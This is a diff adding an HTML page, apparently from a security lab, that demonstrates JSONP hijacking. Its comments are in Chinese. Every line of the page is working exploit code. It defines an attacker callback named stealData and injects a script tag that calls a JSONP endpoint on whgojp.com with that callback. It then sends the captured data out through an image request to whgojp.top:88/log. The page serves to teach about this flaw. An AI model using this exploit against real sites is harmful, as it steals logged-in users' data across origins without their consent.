@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>JSONP Attack Demo</title>
+</head>
+<body>
+<h1>JSONP 漏洞演示</h1>
+<script type="text/javascript">
+  // 定义攻击者控制的回调函数
+  function stealData(data) {
+    console.log("Leaked Data: ", data);  // 打印窃取到的敏感数据
+
+    // 弹窗演示获取到的敏感数据
+    alert("Leaked Data: " + JSON.stringify(data));
+
+    // 将窃取到的数据发送到攻击者服务器（可以选择不启用此功能，仅用于演示）
+    var img = new Image();
+    img.src = "https://whgojp.top:88/log?data=" + encodeURIComponent(JSON.stringify(data));
+  }
+
+  // 通过动态添加 <script> 标签向目标站点发起 JSONP 请求
+  var script = document.createElement("script");
+  script.src = "http://whgojp.com/other/CrossOrigin/jsonpVul?callback=stealData";  // 指定回调函数为攻击者定义的 `stealData`
+  document.body.appendChild(script);
+</script>
+</body>
+</html>
